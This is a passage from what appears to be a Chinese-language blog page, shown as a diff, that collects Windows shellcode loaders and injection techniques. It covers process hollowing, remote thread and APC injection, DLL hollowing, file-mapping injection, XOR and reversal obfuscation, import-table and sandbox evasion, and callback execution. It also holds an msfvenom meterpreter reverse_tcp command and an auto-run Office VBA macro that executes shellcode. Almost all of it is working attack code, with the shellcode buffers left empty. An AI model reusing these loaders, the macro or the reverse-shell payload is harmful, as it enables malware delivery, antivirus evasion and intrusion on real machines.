+    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
+    QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
+    ResumeThread(piex.hThread);
+    CloseHandle(piex.hThread);
+
+    return 0;
+}
+</code></pre>
+<h4 id="进程镂空："><a href="#进程镂空：" class="headerlink" title="进程镂空："></a>进程镂空：</h4><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+int main(int argc, wchar_t* argv[])
+{
+    IN PIMAGE_DOS_HEADER pDosHeaders;
+    IN PIMAGE_NT_HEADERS pNtHeaders;
+    IN PIMAGE_SECTION_HEADER pSectionHeaders;
+
+    IN PVOID FileImage;
+
+    IN HANDLE hFile;
+    OUT DWORD FileReadSize;
+    IN DWORD dwFileSize;
+
+    IN PVOID RemoteImageBase;
+    IN PVOID RemoteProcessMemory;
+
+    unsigned char shellcode[] =
+
+
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    si.cb = sizeof(si);
+
+    //要启动的载荷位置
+    char path[] = &quot;E:\\Study\\code\\Project1\\Project1\\x64\\Release\\notepad.exe&quot;;
+    BOOL bRet = CreateProcessA(
+        NULL,
+        (LPSTR)&quot;cmd&quot;,//白名单进程
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &amp;si,
+        &amp;pi);
+
+    //在本进程获取替换文件的内容
+    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    dwFileSize = GetFileSize(hFile, NULL); //获取替换可执行文件的大小
+    FileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    ReadFile(hFile, FileImage, dwFileSize, &amp;FileReadSize, NULL);
+    CloseHandle(hFile);
+
+    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
+    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); //获取NT头
+
+    GetThreadContext(pi.hThread, &amp;ctx); //获取挂起进程上下文
+
+#ifdef _WIN64
+    ReadReadMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);
+    // 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
+#endif
+    // 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
+#ifdef _X86_
+    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &amp;RemoteImageBase, sizeof(PVOID), NULL);
+#endif
+
+    //判断文件预期加载地址是否被占用
+    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;);
+    if ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)
+    {
+        NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); //卸载已存在文件
+    }
+
+    //为可执行映像分配内存,并写入文件头
+    RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, NULL);
+
+    //逐段写入
+    for (int i = 0; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)
+    {
+        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+        WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, NULL);
+    }
+
+    //将rax寄存器设置为注入软件的入口点
+#ifdef _WIN64
+    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);
+    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+#endif
+
+    //将eax寄存器设置为注入软件的入口点
+#ifdef _X86_
+    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);
+    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+#endif
+
+
+    SetThreadContext(pi.hThread, &amp;ctx); // 设置线程上下文
+    ResumeThread(pi.hThread); // 恢复挂起线程
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+</code></pre>
+<h4 id="进程伪装："><a href="#进程伪装：" class="headerlink" title="进程伪装："></a>进程伪装：</h4><pre><code class="c">#include &quot;Windows.h&quot;
+#include &quot;winternl.h&quot;
+#include &lt;stdio.h&gt;
+#pragma warning(disable:4996);
+typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+void main()
+{	
+    HANDLE h = GetCurrentProcess();
+    PROCESS_BASIC_INFORMATION ProcessInformation;
+    ULONG len = 0;
+    HINSTANCE ntdll;
+    MYPROC GetProcessInformation;
+    wchar_t commandline[] = L&quot;C:\\windows\\system32\\notepad.exe&quot;;
+    ntdll = LoadLibrary(TEXT(&quot;Ntdll.dll&quot;));
+
+    //解析ntdll.dll中NtQueryInformationProcess的地址
+    GetProcessInformation = (MYPROC)GetProcAddress(ntdll, &quot;NtQueryInformationProcess&quot;);
+
+    //获取_PEB对象
+    (GetProcessInformation)(h, ProcessBasicInformation, &amp;ProcessInformation, sizeof(ProcessInformation), &amp;len);
+
+    //替换命令行和映像路径名
+    ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Buffer = commandline;
+    ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Buffer = commandline;
+
+    //反转的shellcode  
+    char* str = &quot;&quot;;
+    
+    unsigned int char_in_hex;
+    //定义迭代器
+    unsigned int iterations = strlen(str);
+
+    //再定义个还原迭代器
+    unsigned int memory_allocation = strlen(str) / 2;
+
+    //申请内存并存放字符字节。内存属性为保留并提交，可读可写权限
+    char* temp = (char*)VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    int p = 0;
+
+    //将shellcode再反转回来
+    for (int i = strlen(str) - 1; i &gt;= 0; i--)
+    {
+        temp[p++] = str[i];
+    }
+
+    //定义一个指针指向反转回正常的shellcode
+    char* shellcode = (char*)temp;
+
+
+    //还原替换为空的\x
+    for (int i = 0; i &lt; iterations - 1; i++) {
+        sscanf(shellcode + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
+        shellcode[i] = (char)char_in_hex;
+
+    }
+    void* exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //复制shellcode到内存
+    memcpy(exec, shellcode, memory_allocation);
+    //CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+    (*(void(*WINAPI)()) exec)();
+    //system(&quot;pause&quot;);
+}
+</code></pre>
+<h4 id="傀儡进程："><a href="#傀儡进程：" class="headerlink" title="傀儡进程："></a>傀儡进程：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+unsigned char buf[] = &quot;&quot;;
+BOOL ReplaceProcess(const char *pszFilePath)
+{
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    CONTEXT threadContext = { 0 };
+    BOOL bRet = FALSE;
+    RtlZeroMemory(&amp;si, sizeof(si));
+    RtlZeroMemory(&amp;pi, sizeof(pi));
+    RtlZeroMemory(&amp;threadContext, sizeof(threadContext));
+    si.cb = sizeof(si);
+    // 创建进程并挂起主线程
+    bRet = CreateProcessA(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
+    if (FALSE == bRet)
+    {
+        printf(&quot;CreateProcess&quot;);
+        return FALSE;
+    }
+    // 在替换的进程中申请一块内存
+    LPVOID lpDestBaseAddr = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (NULL == lpDestBaseAddr)
+    {
+        printf(&quot;VirtualAllocEx&quot;);
+        return FALSE;
+    }
+    // 还原异或
+    for (int i = 0; i &lt; sizeof(buf); i++) {
+        buf[i] ^= 50;
+    }
+    // 写入替换的数据
+    bRet = WriteProcessMemory(pi.hProcess, lpDestBaseAddr, buf, sizeof(buf), NULL);
+    if (FALSE == bRet)
+    {
+        printf(&quot;WriteProcessError&quot;);
+        return FALSE;
+    }
+    // 获取线程上下文
+    // 注意此处标志，一定要写!!!
+    threadContext.ContextFlags = CONTEXT_FULL;
+    bRet = GetThreadContext(pi.hThread, &amp;threadContext);
+    if (FALSE == bRet)
+    {
+        printf(&quot;GetThreadContext&quot;);
+        return FALSE;
+    }
+    // 修改eip从新申请的内存处运行
+    threadContext.Rip = (DWORD64)lpDestBaseAddr;
+    // 设置挂起进程的线程上下文
+    bRet = SetThreadContext(pi.hThread, &amp;threadContext);
+    if (FALSE == bRet)
+    {
+        printf(&quot;SetThreadContext&quot;);
+        return FALSE;
+    }
+    // 恢复挂起的进程的线程
+    ResumeThread(pi.hThread);
+    WaitForSingleObject(pi.hThread, INFINITE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}
+
+void main() {
+    
+    ReplaceProcess(&quot;C:\\Windows\\System32\\notepad.exe&quot;);
+
+}
+</code></pre>
+<h4 id="远线程注入："><a href="#远线程注入：" class="headerlink" title="远线程注入："></a>远线程注入：</h4><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+/* length: 926 bytes */
+unsigned char buf[] = &quot;&quot;;
+INT FoundPid(const wchar_t* szName) {
+    // 设置变量
+    PROCESSENTRY32 pe = { 0 };
+    HANDLE hSnapShot = NULL;
+    int pid = 0;
+    // 初始化大小
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    // 创建进程快照
+    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapShot != INVALID_HANDLE_VALUE) {
+        // 获取快照
+        BOOL Process = Process32First(hSnapShot, &amp;pe);
+        if (!Process) {
+            return -1;
+        }
+        // 遍历快照
+        while (Process32Next(hSnapShot, &amp;pe)) {
+            // 判断进程名是否相同
+            if (!_wcsicmp(szName, pe.szExeFile)) {
+                pid = pe.th32ProcessID;
+                printf(&quot;[+] 找到指定进程pid: %d\n&quot;, pe.th32ProcessID);
+                break;
+            }
+        }
+        CloseHandle(hSnapShot);
+        return pid;
+    }
+    else {
+        printf(&quot;[-] 进程快照创建失败!\t错误值: %d\n&quot;, GetLastError());
+        return -1;
+    }
+}
+void InjectShellCode(const wchar_t* szName)
+{
+    HANDLE Handle, remoteThread;
+    PVOID remoteBuffer;
+    int Pid = FoundPid(szName);
+    Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+    // 还原异或
+    for (int i = 0; i &lt; sizeof(buf); i++) {
+        buf[i] ^= 50;
+    }
+    remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(Handle, remoteBuffer, buf, sizeof(buf), NULL);
+    remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+    CloseHandle(Handle);
+}
+int main(int argc, char* argv[])
+{
+    InjectShellCode(L&quot;notepad.exe&quot;);
+    return 0;
+}
+</code></pre>
+<h4 id="DLL镂空："><a href="#DLL镂空：" class="headerlink" title="DLL镂空："></a>DLL镂空：</h4><pre><code class="c">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;psapi.h&gt;
+
+int main(int argc, char* argv[])
+{
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    wchar_t moduleToInject[] = L&quot;C:\\Users\\World&#39;sEnd\\Desktop\\AarSvc.dll&quot;;
+    HMODULE modules[256] = {};
+    SIZE_T modulesSize = sizeof(modules);
+    DWORD modulesSizeNeeded = 0;
+    DWORD moduleNameSize = 0;
+    SIZE_T modulesCount = 0;
+    CHAR remoteModuleName[128] = {};
+    HMODULE remoteModule = NULL;
+
+    // 64位shellcode
+    unsigned char shellcode[] = &quot;&quot;;
+
+    // 创建远线程注入正常的DLL
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 11932);
+
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);
+    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);
+    HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
+    WaitForSingleObject(dllThread, 1000);
+
+    // 找到注入的DLL模块基址
+    EnumProcessModules(processHandle, modules, modulesSize, &amp;modulesSizeNeeded);
+    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
+    for (size_t i = 0; i &lt; modulesCount; i++)
+    {
+        remoteModule = modules[i];
+        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
+        if (std::string(remoteModuleName).compare(&quot;AarSvc.dll&quot;) == 0)
+        {
+            std::cout &lt;&lt; remoteModuleName &lt;&lt; &quot; at &quot; &lt;&lt; modules[i];
+            break;
+        }
+    }
+
+    //得到DLL入口点
+    DWORD headerBufferSize = 0x1000;
+    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
+    ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader-&gt;e_lfanew);
+    LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
+    std::cout &lt;&lt; &quot;, entryPoint at &quot; &lt;&lt; dllEntryPoint;
+
+    // 覆盖DLL代码
+    WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);
+
+    // 远线程执行
+    CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
+
+    return 0;
+}
+</code></pre>
+<h4 id="利用本土RWX内存注入："><a href="#利用本土RWX内存注入：" class="headerlink" title="利用本土RWX内存注入："></a>利用本土RWX内存注入：</h4><p>枚举RWX进程：</p>
+<pre><code class="c">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+int main()
+{
+    MEMORY_BASIC_INFORMATION mbi = {};
+    LPVOID offset = 0;
+    HANDLE process = NULL;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD bytesWritten = 0;
+
+    Process32First(snapshot, &amp;processEntry);
+    while (Process32Next(snapshot, &amp;processEntry))
+    {
+        process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
+        if (process)
+        {
+            std::wcout &lt;&lt; processEntry.szExeFile &lt;&lt; &quot;\n&quot;;
+            while (VirtualQueryEx(process, offset, &amp;mbi, sizeof(mbi)))
+            {
+                
+                if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE &amp;&amp; mbi.State == MEM_COMMIT &amp;&amp; mbi.Type == MEM_PRIVATE)
+                {
+                    std::cout &lt;&lt; &quot;\tRWX: 0x&quot; &lt;&lt; std::hex &lt;&lt; mbi.BaseAddress &lt;&lt; &quot;\n&quot;;
+                    /*WriteProcessMemory(process, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL);
+                    CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);*/
+                }
+                offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+            }
+            offset = 0;
+        }
+        CloseHandle(process);
+    }
+
+    return 0;
+}
+</code></pre>
+<h4 id="绕过PE导入表检测："><a href="#绕过PE导入表检测：" class="headerlink" title="绕过PE导入表检测："></a>绕过PE导入表检测：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#pragma warning(disable:4996);
+HMODULE  GetKernel32Addr() {
+    HMODULE Kernel32Base = 0;
+    _asm {
+        mov eax, fs: [0x30] //获取peb 进程环境快
+        mov eax, dword ptr[eax + 0xc]//_PEB_LDR_DATA
+        mov eax, dword ptr[eax + 0xc]//InLoadOrderModuleList 
+        mov eax, [eax] //ntdll
+        mov eax, [eax] //kernel32dll
+        mov eax, dword ptr[eax + 0x18]
+        mov Kernel32Base, eax
+    }
+    return Kernel32Base;
+}
+
+void start() {
+
+    char* str = &quot;SHELLCODE&quot;;
+
+    unsigned int char_in_hex;
+
+    unsigned int iterations = strlen(str);
+    unsigned int memory_allocation = strlen(str) / 2;
+
+    char* temp = (char*)VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    int p = 0;
+
+    for (int i = strlen(str) - 1; i &gt;= 0; i--)
+    {
+        temp[p++] = str[i];
+    }
+
+    char* shellcode = (char*)temp;
+
+    for (int i = 0; i &lt; iterations - 1; i++) {
+        sscanf(shellcode + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
+        shellcode[i] = (char)char_in_hex;
+
+    }
+
+    typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);
+
+
+    DWORD oldProtect = 0;
+    HMODULE hKernal32 = GetKernel32Addr();
+
+    pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, &quot;VirtualProtect&quot;);
+
+    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+
+    //VirtualProtect(&amp;shellcode, sizeof(shellcode), oldProtect, NULL);
+    HANDLE handle = CreateThread(0, 0, shellcode, CREATE_SUSPENDED, 0, 0);
+    Sleep(1500000000);
+    ResumeThread(handle);
+}
+
+void main() {
+
+
+    start();
+}
+</code></pre>
+<h4 id="宏："><a href="#宏：" class="headerlink" title="宏："></a>宏：</h4><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.192 LPORT=443 -f csharp
+</code></pre>
+<pre><code class="c#">using System;
+using System.Text;
+
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[354] { };
+
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i &lt; buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] + 2) &amp; 0xFF);
+            }
+            uint counter = 0;
+
+            StringBuilder hex = new StringBuilder(encoded.Length * 2);
+            foreach (byte b in encoded)
+            {
+                hex.AppendFormat(&quot;{0:D}, &quot;, b);
+                counter++;
+                if (counter % 50 == 0)
+                {
+                    hex.AppendFormat(&quot;_{0}&quot;, Environment.NewLine);
+                }
+            }
+
+            Console.WriteLine(&quot;The payload is: &quot; + hex.ToString());
+        }
+    }
+}
+</code></pre>
+<p>制作宏：</p>
+<pre><code class="js">Private Declare PtrSafe Function CreateThread Lib &quot;KERNEL32&quot; (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib &quot;KERNEL32&quot; (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib &quot;KERNEL32&quot; (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Sub MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+    buf = Array(254, 234, )
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) - 2
+    Next i
+    addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub AutoOpen()
+    MyMacro
+End Sub
+</code></pre>
+<h4 id="异或："><a href="#异或：" class="headerlink" title="异或："></a>异或：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+/* length: 834 bytes */
+unsigned char buf[] = &quot;shellcode&quot;;
+void main(){
+  for (size_t i = 0; i &lt; sizeof buf; i++)
+  {
+      buf[i] ^= 74;
+      printf(&quot;\\x%x&quot;, buf[i]);
+  }
+}
+</code></pre>
+<pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+void main() {
+  unsigned char buf[] = &quot;&quot;;
+  
+  //定义一个数组用来存放将异或shellcode还原的字符串
+  unsigned char shellcode[834];
+  
+  //还原shellcode，怎么异或就怎么还原
+  for (size_t i = 0; i &lt; sizeof buf; i++)
+  {
+      buf[i] ^= 7234;
+      
+      //将还原的字符串放入shellcode数组中。
+      shellcode[i] = buf[i];
+  }
+  //VirtualProtect函数要保留一个地址，随便定义一下
+  DWORD temp;
+  
+  //修改内存页的属性，可读可写可执行
+  VirtualProtect(shellcode, sizeof shellcode, PAGE_EXECUTE_READWRITE, &amp;temp);
+  ((void(*)())shellcode)();
+}
+</code></pre>
+<h4 id="逆转："><a href="#逆转：" class="headerlink" title="逆转："></a>逆转：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#pragma warning(disable:4996);
+int main() {
+    //反转的shellcode  
+    char* str = &quot;&quot;;
+    unsigned int char_in_hex;
+    //定义迭代器
+    unsigned int iterations = strlen(str);
+
+    //再定义个还原迭代器
+    unsigned int memory_allocation = strlen(str) / 2;
+
+    //申请内存并存放字符字节。内存属性为保留并提交，可读可写权限
+    char* temp = (char*)VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    int p = 0;
+
+    //将shellcode再反转回来
+    for (int i = strlen(str) - 1; i &gt;= 0; i--)
+    {
+        temp[p++] = str[i];
+    }
+
+    //定义一个指针指向反转回正常的shellcode
+    char* shellcode = (char*)temp;
+
+
+    //还原替换为空的\x
+    for (int i = 0; i &lt; iterations - 1; i++) {
+        sscanf(shellcode + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
+        shellcode[i] = (char)char_in_hex;
+
+    }
+    //申请内存，保留并提交，刻可读可写可执行权限。
+    void* exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //复制shellcode到内存
+    memcpy(exec, shellcode, memory_allocation);
+    //CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+    (*(void(*WINAPI)()) exec)();
+    return 0;
+}
+</code></pre>
+<h4 id="未导出的API："><a href="#未导出的API：" class="headerlink" title="未导出的API："></a>未导出的API：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#pragma comment(lib, &quot;ntdll&quot;)
+using myNtTestAlert = NTSTATUS(NTAPI*)();
+
+int main()
+{
+    char buf[] = &quot;去/X的shellcode&quot;;
+    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));
+
+
+    unsigned int char_in_hex;
+
+    unsigned int iterations = strlen(buf);
+
+    unsigned int memory_allocation = strlen(buf) / 2;
+    //由于字符串编译后默认写入不可写的PE段，所以需要修改内存属性
+
+
+    //还原数组
+    for (unsigned int i = 0; i &lt; iterations / 2; i++) {
+        sscanf_s(buf + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
+        buf[i] = (char)char_in_hex;
+    }
+
+    LPVOID shellAddress = VirtualAlloc(NULL, memory_allocation, MEM_COMMIT, PAGE_EXECUTE);
+
+    WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, memory_allocation, NULL);
+
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+    //插入APC到当前线程
+    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
+
+    //APC队列不为空马上运行
+    testAlert();
+
+    return 0;
+}
+</code></pre>
+<h4 id="文件映射加载："><a href="#文件映射加载：" class="headerlink" title="文件映射加载："></a>文件映射加载：</h4><pre><code class="c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#pragma comment (lib, &quot;OneCore.lib&quot;)
+unsigned char shellcode[] = &quot;&quot;;
+
+int main(int argc, char** argv)
+{
+
+    //创建文件映射内核对象
+    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
+
+    //文件映射对象映射到当前应用程序的地址空间
+    LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));
+
+    memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
+
+    //映射到指定进程的地址空间
+    LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
+
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
+
+    UnmapViewOfFile(lpMapAddress);
+    CloseHandle(hMapping);
+    return 0;
+}
+</code></pre>
+<h4 id="消耗资源沙箱逃逸："><a href="#消耗资源沙箱逃逸：" class="headerlink" title="消耗资源沙箱逃逸："></a>消耗资源沙箱逃逸：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;process.h&gt;
+#include &lt;stdio.h&gt;
+#pragma warning(disable:4996);
+int ShellCode() {
+
+        unsigned char shellcode[] = &quot;&quot;;
+
+        unsigned int key = 743;
+        for (int i = 0; i &lt; sizeof(shellcode); i++) {
+            shellcode[i] ^= key;
+        }
+        HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(shellcode), 0);
+        LPVOID hHeapMemory = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
+        RtlCopyMemory(hHeapMemory, shellcode, sizeof(shellcode));
+        LPDWORD lpThreadId = 0;
+        HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hHeapMemory, NULL, NULL, lpThreadId);
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        HeapFree(hHeap, HEAP_NO_SERIALIZE, hHeapMemory);
+        return 0;
+}
+void starProcess() {
+    /*system(&quot;calc.exe&quot;);*/
+    char* mem = NULL;
+    mem = (char*)malloc(1024);
+    if (mem != NULL) {
+        memset(mem, 0, 1024);
+        free(mem);
+    }
+}
+int main() {
+    for (int i = 0; i &lt; 1000; i++)
+    {
+        _beginthread((_beginthread_proc_type)starProcess, NULL,NULL);
+    }
+    ShellCode();
+    return 0;
+}
+</code></pre>
+<h4 id="回调执行："><a href="#回调执行：" class="headerlink" title="回调执行："></a>回调执行：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+
+int main()
+{
+  char shellcode[] = &quot;&quot;;
+  //申请一片可读可写可执行的内存空间
+  HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+  
+  //将shellcode拷贝到该内存
+  memcpy(hAlloc, shellcode, sizeof(shellcode));
+  
